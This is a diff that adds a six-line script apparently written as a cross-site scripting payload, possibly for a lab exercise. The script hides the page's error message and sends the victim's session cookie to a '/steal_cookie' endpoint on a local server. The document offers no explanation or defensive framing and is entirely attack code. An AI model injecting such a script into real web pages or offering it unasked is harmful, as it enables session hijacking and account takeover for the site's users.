@@ -1,0 +1,6 @@
+<script>
+document.getElementsByClassName('error')[0].style.visibility = 'hidden';
+const xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'http://localhost:3000/steal_cookie?cookie=' + document.cookie.split('=')[1], true);
+xhttp.send();
+</script>
